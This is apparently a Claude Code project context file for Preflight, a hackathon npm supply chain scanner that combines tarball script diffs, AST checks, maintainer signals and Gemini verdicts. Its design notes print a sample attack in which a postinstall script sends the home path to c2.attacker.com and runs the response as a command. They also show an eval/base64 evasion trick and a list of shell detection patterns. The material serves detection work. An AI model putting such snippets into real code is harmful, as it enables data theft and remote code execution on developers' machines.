# Preflight — Project Context for Claude Code

---

## What Is Preflight

**Preflight** is an AI-powered npm supply chain security agent that runs as a GitHub Action.
It intercepts dependency upgrades on pull requests and detects malicious packages
*before* they run — catching novel attacks that CVE-based tools like `npm audit`,
Snyk, and Dependabot completely miss.

**The real-world anchor**: On March 31, 2026, a North Korean state actor (Sapphire Sleet)
hijacked the `axios` npm account (70M+ weekly downloads) and shipped a RAT via a
legitimate-looking version bump. `npm audit` missed it. Snyk missed it. Dependabot missed it.
Because the package was legitimately signed and had no CVE. Preflight would have caught it
in under 30 seconds through behavioral analysis.

---

## Hackathon Context

- **Event**: NMIT Hacks, May 8–10, 2026 (48 hours)
- **Track**: AI & ML
- **Team**: 2 — Rafi (backend, this repo), teammate (frontend dashboard)
- **Judge pitch**: 3 minutes + live demo
- **Winning criteria**: Real incident anchor, live demo, one-line install

---

## Current Build Status (as of May 9, 2026)

### What is DONE and tested

| Component | Status | Notes |
|---|---|---|
| `preflight-api` — all 4 signal services | ✅ Complete | script_diff, ast_scanner, maintainer, gemini |
| `preflight-api` — all routers | ✅ Complete | POST /analyze, GET /scans, GET /scans/:id, GET /packages/*, GET /health |
| `preflight-api` — MongoDB layer | ✅ Complete | client, scans CRUD, packages upsert, TTL index, demo seed |
| `preflight-api` — demo mode | ✅ Complete | demo scan pre-seeded at `64a7f3e2b1c4d5e6f7a8b9c0`, artificial delays |
| `preflight-action` — full TypeScript | ✅ Complete + built | dist/index.js committed (1.28MB bundle) |
| `preflight-action` — action.yml | ✅ Complete | inputs, outputs, permissions comment |
| `preflight-web` — all pages | ✅ Built by teammate | `/`, `/demo`, `/dashboard`, `/scans/[id]` — currently using static mock data from `lib/data.ts` |
| `preflight-web` — API contract | ✅ Complete | `preflight-web/API_CONTRACT.md` with types, integration notes, field mapping |
| Local API test | ✅ Passed | /health ok, demo scan returns BLOCK 94%, real lodash scan returns PASS 95% |

### What is NOT done yet

| Item | What's needed |
|---|---|
| Deploy to Render | Paste `GEMINI_API_KEY` + `MONGODB_URI` into Render dashboard. `render.yaml` is ready. |
| Deploy to Vercel | Import repo, set root dir = `preflight-web`, add `NEXT_PUBLIC_API_URL` env var |
| Keep-alive cron | cron-job.org free, ping `GET /health` every 14 minutes |
| `v1.0.0` git tag | `git tag v1.0.0 && git push origin v1.0.0` — needed for action reference |
| Frontend API wiring | Teammate needs to replace `lib/data.ts` mock data with real `lib/api.ts` calls |
| GitHub Action e2e test | Create test repo, open PR with package-lock change, verify comment posts |

### Credentials (local .env confirmed working)

- `GEMINI_API_KEY` — set in `preflight-api/.env`, tested locally, Gemini calls working
- `MONGODB_URI` — Atlas cluster, `smrafi405_db_user`, `preflight_db` database
- Both need to be added to Render dashboard environment variables before deploy

### Sponsor Integrations (required for prizes)

| Sponsor | How we use it | Tier |
|---|---|---|
| GitHub | Core distribution — GitHub Action IS the product | 1 |
| Google Cloud + Gemini | LLM reasoning layer — `gemini-2.5-flash` + `gemini-2.5-pro` | 1 |
| MongoDB Atlas | Community threat intelligence — `preflight_db` | 1 |
| Render | FastAPI deployment hosting | 1 |
| ElevenLabs | Voice BLOCK alert on demo page (stretch) | 2 |
| Snowflake | Analytics pipeline (stretch) | 2 |
| Solana | Immutable audit log (stretch) | 3 |

---

## The Detection Engine — 4 Layers

Every package upgrade is analyzed through four sequential signal layers:

```
1. Script Diff Analysis
   → Fetch tarballs for old + new version from npm registry
   → Extract pre/postinstall/install scripts from package.json inside tarball
   → Diff scripts between versions
   → Flag: new hooks added (HIGH), existing hooks modified (MEDIUM)

2. AST Behavioral Scan
   → Shell scanner FIRST (regex): curl, wget, bash -c, base64 -d, eval $(...)
   → If hook is node <file>, extract that file from tarball and parse with acorn via subprocess
   → If hook is inline JS expression, parse directly
   → Flag combinations (not standalone): eval(var) + any, spawn(var) + net, https + spawn
   → NEVER flag standalone require('https') — too many false positives

3. Maintainer Signal Scoring (npm Registry API)
   → Account age, last publish date, provenance attestation delta
   → npm uses Sigstore provenance (dist.signatures + _attestations fields)
   → Flag: provenance ABSENT on new version when present on old (CRITICAL)
   → Flag: 90+ days inactive then sudden push (HIGH)
   → Flag: new maintainer added (HIGH)

4. Gemini AI Reasoning (gemini-2.5-flash primary, gemini-2.5-pro for BLOCK confirmation)
   → Synthesize all 3 signal outputs with structured JSON prompt
   → Output: PASS / WARN / BLOCK + confidence + summary (2 sentences max) + attack_pattern
   → Always Flash first; if Flash returns BLOCK ≥0.85, run parallel Pro confirmation
   → Posted as GitHub PR comment + sets commit status check
```

### Gemini Prompt Template (first-class artifact — do not change without updating here)

```
You are a senior supply chain security researcher. Analyze the following npm package upgrade signals and output a verdict.

Signals: {signals_json}

Output ONLY valid JSON with this exact schema, no preamble:
{
  "verdict": "PASS" | "WARN" | "BLOCK",
  "confidence": 0.0-1.0,
  "summary": "max 2 sentences explaining the verdict",
  "attack_pattern": "snake_case identifier or null"
}

Rules:
- BLOCK: confidence >= 0.85 AND 2+ signals flagged
- WARN: confidence >= 0.60 AND 1+ signal flagged
- PASS: otherwise
- Do not explain your reasoning outside the JSON object.

Examples:
[BLOCK example]: signals show new postinstall with outbound HTTPS + key change → {"verdict":"BLOCK","confidence":0.94,"summary":"New postinstall hook opens outbound connection combined with provenance attestation removal after 8 months inactivity. Pattern matches known supply chain hijack.","attack_pattern":"npm_account_hijack_rat_deployment"}
[WARN example]: signals show only minor hook change, no network call → {"verdict":"WARN","confidence":0.65,"summary":"Postinstall hook modified but no network activity detected. Recommend manual review before merging.","attack_pattern":null}
[PASS example]: no signals flagged → {"verdict":"PASS","confidence":0.97,"summary":"No suspicious behavior detected in this upgrade.","attack_pattern":null}
```

### Gemini Fail-Safe (when Gemini unreachable)

```python
flagged_count = sum([script_diff.flagged, ast_scan.flagged, maintainer.flagged])
if flagged_count >= 3:   verdict, confidence = "BLOCK", 0.90
elif flagged_count == 2: verdict, confidence = "WARN",  0.65
elif flagged_count == 1: verdict, confidence = "WARN",  0.40
else:                    verdict, confidence = "PASS",  0.95
```

### Maintainer Risk Score Formula

```
score = 0
+ provenance removed when previously present: +50
+ inactive_days > 180:                        +35
+ inactive_days 90-180:                       +25
+ new_maintainer_added:                       +20
  (weight -10 if downloads > 1M AND package_age > 365 days)
+ package_age < 30 days AND weekly_downloads > 10000: +15
cap at 100
```

### Confidence Thresholds

- `BLOCK` only if confidence ≥ 0.85
- `WARN` for 0.60–0.84
- `PASS` below 0.60

### Hard Override Rules (bypass Gemini verdict)

```
3+ signals flagged              → always BLOCK, confidence 0.90
provenance removed + new net call → always BLOCK, confidence 0.95
Gemini unreachable              → rule-based fallback (see above)
API unreachable from action     → WARN, fail open (never silent block)
```

---

## Repo Structure

```
preflight/
├── preflight-action/              # GitHub Action (TypeScript)
│   ├── src/
│   │   ├── index.ts               # Entrypoint: inputs → API → PR comment
│   │   ├── config/env.ts          # Zod-validated env vars
│   │   ├── adapters/
│   │   │   ├── analysis-api.ts    # POST /analyze client
│   │   │   └── github.ts          # Post PR comment, set status check
│   │   ├── services/lockfile.ts   # Parse package-lock.json diff
│   │   └── errors/index.ts
│   ├── action.yml
│   └── package.json               # deps: @actions/core, @actions/github, zod, node-fetch
│
├── preflight-api/                 # FastAPI analysis service (Python)
│   ├── app/
│   │   ├── main.py                # App init, lifespan, /health
│   │   ├── config/settings.py     # pydantic-settings (all env vars)
│   │   ├── routers/
│   │   │   ├── analyze.py         # POST /analyze
│   │   │   ├── scans.py           # GET /scans, GET /scans/:id
│   │   │   └── packages.py        # GET /packages/:name/threat, GET /packages/top-threats
│   │   ├── services/
│   │   │   ├── script_diff.py     # Signal 1 — tarball fetch + hook diff
│   │   │   ├── ast_scanner.py     # Signal 2 — shell regex + acorn subprocess
│   │   │   ├── maintainer.py      # Signal 3 — npm registry, provenance check
│   │   │   └── gemini.py          # Signal 4 — Gemini API, structured JSON
│   │   ├── db/
│   │   │   ├── client.py          # MongoDB motor async client (lifespan managed)
│   │   │   ├── scans.py           # Scans collection CRUD
│   │   │   └── packages.py        # Packages collection upsert
│   │   ├── schemas/analysis.py    # Pydantic models for all request/response shapes
│   │   └── errors.py
│   ├── requirements.txt
│   └── render.yaml
│
├── preflight-web/                 # Next.js dashboard (frontend teammate's domain)
│   ├── app/
│   │   ├── page.tsx               # / landing
│   │   ├── dashboard/page.tsx     # /dashboard live feed
│   │   ├── demo/page.tsx          # /demo interactive ← most important for hackathon
│   │   └── scans/[id]/page.tsx    # /scans/:id drill-down
│   ├── components/                # 8 components (see Frontend Spec below)
│   └── lib/api.ts                 # API client
│
├── demo/
│   ├── verdaccio/config.yaml      # Local npm registry config
│   └── mock-axios-malicious/      # Fake axios 1.7.10 with postinstall RAT stub
│
└── CLAUDE.md                      # This file
```

---

## Complete API Contract — Single Source of Truth

**All code must conform to this. Never deviate without updating this file.**

**Base URL (production):** `https://preflight-api.onrender.com`

### POST /analyze

```json
// Request
{
  "package_name": "axios",
  "old_version": "1.7.9",      // null if new dependency
  "new_version": "1.7.10",
  "repo": "org/repo-name",     // optional
  "pr_number": 42,             // optional
  "demo": false                // true → return pre-seeded demo result, skip real analysis
}

// Response
{
  "scan_id": "64a7f3e2b1c4d5e6f7a8b9c0",  // MongoDB ObjectId as string
  "verdict": "BLOCK",
  "confidence": 0.94,
  "duration_ms": 2840,
  "signals": {
    "script_diff": {
      "flagged": true,
      "new_hooks": ["postinstall"],
      "changed_hooks": [],
      "reason": "New postinstall hook added in 1.7.10"
    },
    "ast_scan": {
      "flagged": true,
      "patterns": ["outbound_https", "process_spawn"],
      "severity": "high",
      "reason": "Postinstall script opens outbound connection and spawns child process"
    },
    "maintainer": {
      "flagged": true,
      "risk_score": 92,
      "key_changed": true,
      "inactive_days": 238,
      "reason": "Provenance attestation removed after 8 months of inactivity"
    },
    "llm_reasoning": {
      "verdict": "BLOCK",
      "confidence": 0.94,
      "summary": "Pattern matches known supply chain attack: new postinstall hook with outbound network call combined with provenance removal after inactivity is high-confidence malicious.",
      "attack_pattern": "npm_account_hijack_rat_deployment"
    }
  }
}
```

### GET /health

```json
{
  "status": "ok",
  "checks": {
    "mongodb": "connected",
    "npm_registry": "reachable",
    "gemini_api": "reachable"
  },
  "version": "1.0.0"
}
```

### GET /scans?page=1&limit=20

Returns paginated scans sorted by `scanned_at DESC`. Excludes `is_demo: true` scans.

### GET /scans/:scan_id

Full scan object. `scan_id` is MongoDB ObjectId as hex string. Used by PR comment links.

### GET /packages/:name/threat

```json
{
  "package_name": "axios",
  "total_scans": 423,
  "block_count": 1,
  "warn_count": 3,
  "pass_count": 419,
  "community_threat_score": 72,
  "last_flagged_at": "2026-05-08T14:23:00Z",
  "flagged_versions": ["1.7.10"],
  "safe_versions": ["1.7.9", "1.7.8"]
}
// If total_scans < 5:
// { "package_name": "axios", "total_scans": 3, "score": null, "reason": "insufficient_data", "minimum_scans": 5 }
```

### GET /packages/top-threats?limit=10

Top packages by community_threat_score. Minimum 5 scans to appear.

---

## MongoDB Data Models

**Database:** `preflight_db`

### Collection: scans

```
_id (ObjectId), package_name (string), old_version (string|null), new_version (string),
verdict ("PASS"|"WARN"|"BLOCK"), confidence (float 0.0-1.0),
repo (string|null), pr_number (int|null),
is_demo (bool, default false),          ← exclude from community scores
signals {
  script_diff { flagged, new_hooks[], changed_hooks[], reason },
  ast_scan    { flagged, patterns[], severity, reason },
  maintainer  { flagged, risk_score, key_changed, inactive_days, reason },
  llm_reasoning { verdict, confidence, summary, attack_pattern }
},
duration_ms (int), scanned_at (datetime, indexed DESC), created_at (datetime)

Indexes:
  scanned_at DESC              (feed queries)
  package_name + new_version   (threat lookup)
  verdict                      (filter by verdict)
  package_name + verdict        (compound — "all BLOCKs for package X")
  scanned_at TTL 30 days        (expireAfterSeconds: 2592000 — Atlas free tier limit)
```

### Collection: packages

```
_id (ObjectId), package_name (string, unique index),
total_scans (int), block_count (int), warn_count (int), pass_count (int),
community_threat_score (int 0-100, indexed DESC),
last_flagged_at (datetime|null), flagged_versions[] (string array),
safe_versions[] (string array, capped 20, newest first — $push with $slice: -20),
updated_at (datetime)

Community threat score formula:
  score = (block_count * 100 + warn_count * 40) / total_scans
  Capped at 100. Requires minimum 5 total_scans to be shown publicly.
  Excludes scans where is_demo=true.
```

### ObjectId serialization

Python motor returns ObjectId objects. Serialize as `str(_id)` in all JSON responses.
Use `json_encoders = {ObjectId: str}` in Pydantic config or a custom serializer.

---

## GitHub Action — action.yml Requirements

```yaml
name: 'Preflight Supply Chain Scan'
description: 'Behavioral pre-execution interceptor for npm packages'

inputs:
  lockfile:
    description: 'Path to package-lock.json'
    required: false
    default: 'package-lock.json'
  api_url:
    description: 'Preflight API URL'
    required: false
    default: 'https://preflight-api.onrender.com'

outputs:
  verdict:
    description: 'PASS, WARN, or BLOCK'
  scan_id:
    description: 'MongoDB scan ID for the full report'

runs:
  using: 'node20'
  main: 'dist/index.js'

# Required permissions (must be in the workflow file that uses this action):
# permissions:
#   pull-requests: write   # post PR comment
#   statuses: write        # set commit status check
#   contents: read         # read package-lock.json
```

### action.yml note on SHA pinning

Every public YAML snippet (README, landing page) must show `@v1.0.0` (immutable tag),
NOT `@v1` (mutable). Using a mutable tag on a supply chain security tool is a credibility hole.

---

## GitHub Action Output — PR Comment Format

```markdown
## 🔴 Preflight: BLOCK — Dependency Update Intercepted

**`axios`** `1.7.9 → 1.7.10` · Confidence: **94%** · 2.84s

> This matches the pattern of a supply chain hijack. New postinstall hook
> with outbound network call combined with provenance removal after 8
> months of inactivity is high-confidence malicious activity.

| Signal      | Status     | Detail                                      |
|-------------|------------|---------------------------------------------|
| Script diff | 🚨 Flagged | New postinstall hook added                  |
| AST scan    | 🚨 Flagged | Outbound HTTPS + process.spawn detected     |
| Maintainer  | 🚨 Flagged | Provenance removed, 238 days inactive       |
| Gemini AI   | 🚨 Flagged | npm account hijack + RAT deployment pattern |

Attack pattern: npm_account_hijack_rat_deployment

❌ Do NOT merge · 🔍 Review manually · 📢 Report to npm security

[Preflight](https://preflight.dev) · [View full analysis →](https://preflight.dev/scans/64a7...)
```

Verdict headers: 🔴 BLOCK | 🟡 WARN | 🟢 PASS

---

## Frontend Spec

### Aesthetic: Neo-Brutalist Terminal

Security tool for developers. High contrast. Hard corners. No soft shadows. No gradients. War room aesthetic.

### Design Tokens

```css
--bg-primary:     #0A0A0A
--bg-surface:     #111111
--bg-elevated:    #1A1A1A
--border:         #2A2A2A
--border-strong:  #404040
--text-primary:   #F0F0F0
--text-secondary: #888888
--text-muted:     #555555
--accent-pass:    #00FF88
--accent-warn:    #FFB800
--accent-block:   #FF3B30
--accent-blue:    #4A9EFF
--font-mono:    'JetBrains Mono', monospace
--font-sans:    'Inter', sans-serif
--font-display: 'Space Grotesk', sans-serif
```

### Pages (4 total)

**/ Landing**
- Hero: "The axios attack lasted 3 hours." / "70M weekly downloads. Zero tools caught it." / "Preflight would have blocked it in 30 seconds."
- CTA: "See it live" → /demo
- Install snippet with copy button (`uses: preflight-ai/preflight@v1.0.0`)
- Live community stats (3 counters, polling GET /scans every 10s)
- 4-signal grid

**/dashboard**
- 70% live scan feed / 30% sidebar
- ScanCard: collapsed 72px, click to expand → signal pills + confidence bar
- New cards slide in at top in real time
- Sidebar: Top Threats, Today's Stats, Try demo link

**/demo ← Most important for hackathon**
- Pre-filled locked form: axios 1.7.9 → 1.7.10 + label "The exact attack from March 31, 2026"
- "Run Preflight analysis" button → calls POST /analyze with `demo: true`
- 4 SignalRows animate in sequentially (150ms stagger): pending → analyzing → flagged/clear
- Verdict card drops: BLOCK, 94%, Gemini summary, attack_pattern
- PR comment preview below
- No GitHub account required

**/scans/:id**
- Full drill-down. PR comments link here. Shareable.
- Verdict header + Gemini summary + confidence bar
- 4 expandable signal cards with full detail including actual script code block

### Component Library

| Component | Key Props | Notes |
|---|---|---|
| VerdictBadge | verdict: "PASS"\|"WARN"\|"BLOCK" | Monospace, all-caps, 1px border, bg tint |
| ScanCard | scan object | 72px collapsed, click to expand |
| SignalPill | name, flagged: bool | Green dot (clear) / red dot (flagged) |
| ConfidenceBar | confidence: 0-1 | 4px height, color by threshold |
| InstallSnippet | code, language | Dark block, copy button |
| StatCounter | value, label | Large mono number, count-up animation |
| SignalRow | name, status, reason | pending→analyzing→flagged/clear states |
| LivePulse | — | CSS only, green pulse dot, 2s loop |

---

## Tech Stack — Final Locked

| Layer | Technology | Sponsor |
|---|---|---|
| Action runtime | GitHub Actions (TypeScript) | GitHub |
| Analysis API | Python FastAPI | — |
| API hosting | Render | Render |
| LLM reasoning | **Gemini 2.5 Flash** (primary) + **Pro** (BLOCK confirm) | Google Cloud + Gemini |
| Database | MongoDB Atlas | MongoDB |
| Frontend | Next.js (App Router) | — |
| Frontend hosting | Vercel (free) | — |
| AST parsing | acorn (via Node.js subprocess from Python) | — |
| npm data | npm Registry REST API | — |
| GitHub data | GitHub REST API + Actions toolkit | GitHub |
| Demo registry | Verdaccio (local) | — |

**CRITICAL NOTE on acorn**: `acorn-py` does NOT exist on PyPI. Use a Node.js subprocess:
```python
import subprocess, json
result = subprocess.run(
    ["node", "-e", f"const acorn=require('acorn');console.log(JSON.stringify(acorn.parse({json.dumps(js_code)},{{ecmaVersion:2022,sourceType:'module'}})))"],
    capture_output=True, text=True, timeout=30
)
```
Or ship `acorn` in `preflight-api/` as a local Node module and call it via subprocess.

---

## Environment Variables

### preflight-action (TypeScript)

```
PREFLIGHT_API_URL=https://preflight-api.onrender.com
GITHUB_TOKEN=                              # auto-injected by GitHub Actions
```

### preflight-api (Python)

```
GEMINI_API_KEY=                            # Google AI Studio key
MONGODB_URI=mongodb+srv://...              # Atlas connection string
MONGODB_DB_NAME=preflight_db
NPM_REGISTRY_URL=https://registry.npmjs.org
ANALYSIS_TIMEOUT_MS=45000
LOG_LEVEL=INFO
HOST=0.0.0.0
PORT=8000
```

### preflight-web (Next.js)

```
NEXT_PUBLIC_API_URL=https://preflight-api.onrender.com
NEXT_PUBLIC_POLL_INTERVAL_MS=10000
```

---

## Build Tooling Requirements (must exist before any code runs)

### preflight-action

Required `package.json` dependencies:
```json
{
  "dependencies": {
    "@actions/core": "^1.10.0",
    "@actions/github": "^6.0.0",
    "zod": "^3.22.0",
    "node-fetch": "^3.3.0"
  },
  "devDependencies": {
    "@types/node": "^20.0.0",
    "typescript": "^5.0.0",
    "@vercel/ncc": "^0.38.0"
  },
  "scripts": {
    "build": "tsc && ncc build dist/index.js -o dist --license licenses.txt",
    "package": "npm run build"
  }
}
```

Required `tsconfig.json` (at `preflight-action/tsconfig.json`):
```json
{ "compilerOptions": { "target": "ES2022", "module": "commonjs", "outDir": "dist", "strict": true } }
```

### preflight-api

`requirements.txt` — confirmed working on Python 3.11 (Render) and Python 3.13 (local):
```
fastapi==0.115.0
uvicorn[standard]==0.30.0
pydantic==2.10.6
pydantic-settings==2.7.0
motor==3.7.0
google-generativeai==0.8.3
requests==2.32.3
httpx==0.27.0
python-multipart==0.0.9
```

**Why these versions (not the originals):**
- `pydantic 2.7.0` had no Python 3.13 wheel — needed source build with Rust/MSVC which fails on most setups. `2.10.6` ships prebuilt wheels for 3.13.
- `motor 3.4.0` tried to import `_QUERY_OPTIONS` from `pymongo.cursor` — removed in pymongo 4.10. `motor 3.7.0` is explicitly compatible with pymongo 4.9+.

**acorn** is managed via `preflight-api/package.json` (committed). `npm install acorn` runs as part of `render.yaml` buildCommand. Locally, run `npm install acorn` from `preflight-api/` before starting the server.

### preflight-web

Required `next.config.js` (standard App Router config, nothing custom needed).

---

## Critical Rules — Never Break These

1. **Stateless per-request** — no state stored between requests; MongoDB writes are OK
2. **Timeout everything** — npm registry calls: 10s, AST scan: 30s, Gemini API: 45s
3. **Never run postinstall hooks** — analyze scripts, never execute them
4. **Fail open, not closed** — if API unreachable, action warns but does not hard-block
5. **Confidence thresholds** — BLOCK ≥0.85; WARN 0.60–0.84; PASS below
6. **One verdict per package** — no transitive deps (scope creep)
7. **Sequential multi-package processing** — not parallel; 1s delay between calls; cap at 3 per PR
8. **Demo mode isolation** — `is_demo: true` scans excluded from all community score calculations
9. **CORS required** — FastAPI must allow the Vercel frontend origin
10. **ObjectId serialization** — always serialize MongoDB `_id` as `str()` in JSON responses
11. **Input validation** — package_name must match npm name regex `^(@[a-z0-9-~][a-z0-9-._~]*/)?[a-z0-9-~][a-z0-9-._~]*$`

---

## Demo Mode Implementation

The demo on `preflight.dev` must be resilient regardless of Verdaccio, Render cold start, or Gemini rate limits.

**Strategy**: Pre-seed a fixed demo scan in MongoDB at startup. When `POST /analyze` receives `demo: true` (or the package is `axios` + versions `1.7.9 → 1.7.10` + `demo=true`), return the seeded result with artificial per-signal delays (500ms, 700ms, 600ms, 900ms) to make the UI animation feel real. Gemini is NOT called during demo mode.

**Demo seed document**: Fixed scan_id, BLOCK verdict, confidence 0.94, all 4 signals flagged, attack_pattern `npm_account_hijack_rat_deployment`. Seeded via a `seed_demo_data()` call in the FastAPI lifespan startup.

**Render cold start fix**: Add a keep-alive cron job (cron-job.org or Render cron) pinging `GET /health` every 14 minutes.

**Gemini rate limits**: Gemini 2.5 Flash: 15 RPM free. Use Flash for all real scans. Use separate API keys for dev/staging/prod. Pro only for BLOCK confirmation (parallel call).

---

## Demo Scenario — The Axios Attack

```
Package:      axios
Old version:  1.7.9  (clean)
New version:  1.7.10 (malicious — served from Verdaccio mock OR demo mode)

Expected signals:
  script_diff.flagged   = true  (new postinstall hook)
  ast_scan.flagged      = true  (outbound http call in postinstall)
  maintainer.flagged    = true  (provenance attestation removed)
  llm_reasoning.flagged = true  (BLOCK)

Expected verdict: BLOCK, confidence >= 0.90, attack_pattern: npm_account_hijack_rat_deployment

Demo flow:
  1. Open /demo page on preflight.dev
  2. Click "Run Preflight analysis" (axios 1.7.9 → 1.7.10 pre-filled)
  3. 4 SignalRows animate in sequentially with staggered timing
  4. Verdict card drops: BLOCK 94%
  5. PR comment preview shown below
  6. [Optional] Show real GitHub PR with the action comment
```

---

## Known Implementation Risks (resolve before demo)

### CRITICAL — will break demo

| # | Risk | Status | Resolution |
|---|---|---|---|
| C1 | `acorn-py` doesn't exist on PyPI | ✅ Fixed | Node.js subprocess implemented in `ast_scanner.py`; `package.json` + `npm install acorn` in `render.yaml` |
| C2 | `preflight-action/package.json` has empty deps | ✅ Fixed | All deps added: @actions/core, @actions/github, zod, node-fetch, ncc |
| C3 | No tsconfig.json | ✅ Fixed | Created at `preflight-action/tsconfig.json` |
| C4 | action.yml missing inputs/outputs/permissions | ✅ Fixed | Complete action.yml with all inputs, outputs, permissions comment |
| C5 | No demo pre-seeded data | ✅ Fixed | `seed_demo_data()` in FastAPI lifespan; ID `64a7f3e2b1c4d5e6f7a8b9c0`; tested locally |
| C6 | Render cold start on first demo | ⏳ Pending | Set up keep-alive cron (cron-job.org, ping /health every 14 min) after deploy |
| C7 | No CORS on FastAPI | ✅ Fixed | `allow_origins=["*"]` in `main.py` |
| C8 | MongoDB ObjectId not JSON serializable | ✅ Fixed | `_serialize()` in `db/scans.py` converts `_id` → `scan_id` as string |

### HIGH — correctness bugs

| # | Risk | Status | Notes |
|---|---|---|---|
| H1 | npm API has no signing_key_fingerprint | ✅ Fixed | Using `dist.signatures` + `dist.attestations` (Sigstore) in `maintainer.py` |
| H2 | acorn fails on shell scripts | ✅ Fixed | Shell regex runs first; acorn only called if hook is `node <file>` or inline JS |
| H3 | require('https') standalone = false positive | ✅ Fixed | Only flags combinations: outbound net + spawn/eval in same script |
| H4 | acorn must follow file paths into tarball | ✅ Fixed | `_fetch_file_from_tarball()` in `ast_scanner.py` extracts the JS file then parses |
| H5 | Gemini prompt not written | ✅ Fixed | Full few-shot prompt with 3 examples in `gemini.py` |
| H6 | Gemini fail-safe not written | ✅ Fixed | `_rule_based_fallback()` in `gemini.py` |
| H7 | Demo runs pollute community scores | ✅ Fixed | `is_demo: true` excluded from all `packages.py` upsert calculations |
| H8 | Multi-package PRs hit Gemini rate limits | ✅ Fixed | Sequential processing, 1s delay, cap 3 per PR in `src/index.ts` |

### MEDIUM — edge cases

| # | Risk | Status | Notes |
|---|---|---|---|
| M1 | old_version=null crashes Signal 1 | ✅ Fixed | Handles null: any hook on new dep = HIGH flag |
| M2 | GET /packages/:name/threat with <5 scans | ✅ Fixed | Returns `{score: null, reason: "insufficient_data"}` |
| M3 | No rate limiting on POST /analyze | ⚠️ Open | Not implemented — acceptable for hackathon |
| M4 | package_name path traversal | ✅ Fixed | NPM_NAME_RE regex validates before any file I/O |
| M5 | safe_versions[] cap | ✅ Fixed | `$push` with `$slice: -20` in `packages.py` |
| M6 | SHA pinning in docs | ✅ Fixed | All examples use `@v1.0.0` |
| M7 | Gemini Pro slowest path | ✅ Fixed | Flash first; parallel Pro only on BLOCK ≥0.85 |
| M8 | No workflow example in repo | ✅ Fixed | `demo/.github/workflows/preflight.yml` added |

### Frontend integration gaps (for teammate)

| # | Issue | Fix needed in `preflight-web/` |
|---|---|---|
| F1 | All pages use static `lib/data.ts` mock data | Wire to real API using `lib/api.ts` (see `API_CONTRACT.md`) |
| F2 | `/demo` page doesn't call the API | Call `POST /analyze` with `demo: true` instead of static animation |
| F3 | `/scans/[id]` ignores route param | Use `useParams()` + `getScan(id)` from `lib/api.ts` |
| F4 | Demo verdict card links to wrong scan ID | Change `scn_a1f7e2` → `64a7f3e2b1c4d5e6f7a8b9c0` |
| F5 | `INSTALL_YAML` in `lib/data.ts` has wrong input names | `fail-on` → `fail_on_block`; remove `comment: true` (doesn't exist) |
| F6 | `LlmReasoningSignal` has no `flagged` field | Derive: `flagged = signals.llm_reasoning.verdict !== 'PASS'` |
| F7 | API signals are object, ScanCard expects array | Use `signalsToArray()` helper (see `API_CONTRACT.md` §3) |

### Pitch risks

| # | Risk | Resolution |
|---|---|---|
| P1 | "npm audit/Snyk missed it" needs a source | Rephrase: "CVE-based tools require a CVE; the axios attack had none because the account was legitimately compromised" |
| P2 | Socket.dev does similar behavioral analysis | Differentiators: open-source MIT, zero signup, one-line YAML, no org permissions, free forever |
| P3 | "Gets smarter" implies ML | Use: "aggregates community threat signal — every scan contributes to a shared intelligence layer" |

---

## Signal Layer Design & Hardening Notes

### script_diff.py — hardened (session 2, May 9 2026)

Eight production gaps were identified and fixed. The current file on disk is the hardened version.

| # | Gap | Fix |
|---|---|---|
| 1 | `data["dist"]["tarball"]` unguarded — KeyError crash on any malformed registry response | `data.get("dist", {}).get("tarball")` + explicit `PackageNotFoundError` |
| 2 | Non-404 HTTP errors from registry not caught (5xx, etc.) | `HTTPStatusError` caught and re-raised as `RegistryTimeoutError` on metadata call |
| 3 | Non-404 HTTP errors from tarball CDN not caught | Same — wrapped on tarball download call |
| 4 | Single `_REGISTRY_TIMEOUT = 10s` for both metadata AND tarball download | Split: `_METADATA_TIMEOUT = 10s`, `_TARBALL_TIMEOUT = 30s` |
| 5 | `r.content` loads entire tarball into memory — OOM risk on Render free tier (512MB) | 50MB hard cap (`_MAX_TARBALL_BYTES`); oversized packages return empty hooks (attack packages are always small) |
| 6 | `tarfile.open()` and `json.loads()` unguarded | `TarError`, `JSONDecodeError`, `UnicodeDecodeError` all caught — treated as no hooks |
| 7 | `scripts[key]` value not type-checked — would store dicts if package.json is malformed | `isinstance(val, str)` guard before storing |
| 8 | Old and new tarballs fetched sequentially | `asyncio.gather()` when both versions present — cuts ~50% wall time |
| 9 | Tarball bytes discarded after parsing — ast_scanner had to re-download | `_extract_hooks()` now returns `(hooks, tarball_url, raw_bytes)` as 3-tuple; `ScriptDiffResult` carries `tarball_bytes: bytes \| None`; analyze.py passes it to ast_scanner |

**`prepare` hook deliberately NOT in `HOOK_KEYS`**: `prepare` does not run when installing a package from the npm registry as a dependency (npm v7+). It only runs when developing the package locally or installing from a git URL. Adding it would generate false positives on React, Babel, and most major packages.

---

### ast_scanner.py — design rationale (session 2, May 9 2026)

The question was raised: is AST scanning feasible, or does it create an inefficient knowledge graph?

**It is not a knowledge graph.** What it actually does:

1. acorn parses the JS string → AST in ~5ms for a typical postinstall script
2. Single O(n) traversal over AST nodes
3. Looks for specific `CallExpression` types: `eval`, `spawn`, `exec`, `https.get`
4. Flags **combinations** only — not standalone calls (avoids false positives on `require('https')`)

**Why it cannot be replaced by the shell regex scanner alone:**

The shell regex scanner catches `curl`, `wget`, `bash -c`, `base64 -d` — shell primitives. Real JS supply chain attacks use patterns like:

```js
const https = require('https');
const cp = require('child_process');
https.get(`https://c2.attacker.com/?d=${process.env.HOME}`, (r) => {
  r.on('data', (d) => cp.exec(d.toString()));
});
```

No shell commands. Shell regex returns clean. AST scanner catches `https + spawn` combination.

**Known limitation — obfuscation evades it:**

```js
const f = eval;
f(Buffer.from('bWFsd...', 'base64').toString());  // alias — not caught
```

We match `eval` as an identifier in the `CallExpression` node. Aliasing it evades the pattern. However: real supply chain attackers rarely obfuscate postinstall hooks — they rely on the package looking legitimate. Heavy obfuscation in a postinstall is itself a signal Gemini catches independently.

**Performance:** acorn subprocess cold start ~200ms, parsing <10ms. Negligible within the 45s analysis budget.

---

### ast_scanner.py — hardened (session 3, May 9 2026)

| # | Gap | Fix |
|---|---|---|
| 1 | `new Function()` detection checked `CallExpression` only — `new Function(...)` is a `NewExpression` in the AST, not caught | Added parallel `NewExpression` handler in walk(); both call and constructor forms now flagged |
| 2 | `_REGISTRY_TIMEOUT = 10.0` used for tarball download — too short, inconsistent with script_diff | Renamed to `_TARBALL_TIMEOUT = 30.0` |
| 3 | `r.raise_for_status()` in `_fetch_file_from_tarball` unguarded — CDN 4xx/5xx raises `httpx.HTTPStatusError` uncaught | Refactored into `_fetch_tarball_bytes()` with proper try/except → `RegistryTimeoutError` |
